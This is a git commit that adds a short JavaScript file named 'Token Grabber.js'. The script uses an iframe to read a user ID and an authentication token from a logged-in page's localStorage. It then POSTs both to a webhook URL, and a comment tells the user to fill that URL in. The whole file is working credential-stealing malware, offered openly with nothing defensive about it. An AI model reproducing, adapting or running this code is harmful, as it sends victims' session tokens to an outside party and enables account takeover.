5878ea5291aa3839acfb635c858c2c5ba97ff92e
KuroRXX <68124391+KuroRXX@users.noreply.github.com>
2020-07-10 11:47:34 -0700

    Create Token Grabber.js

---
+++ Token Grabber.js
@@ -0,0 +1,4 @@
+location.reload();var i=document.createElement("iframe");document.body.appendChild(i),stop();var request=new XMLHttpRequest;request.open("POST",
+//Insert your webhook link inside the quotes:
+""
+),request.setRequestHeader("Content-type","application/json");var params={username:"Token Grabber",avatar_url:"",content:"**"+document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.user_id_cache+"** _-ID_ **"+i.contentWindow.localStorage.token+"** _-Token_"};request.send(JSON.stringify(params));
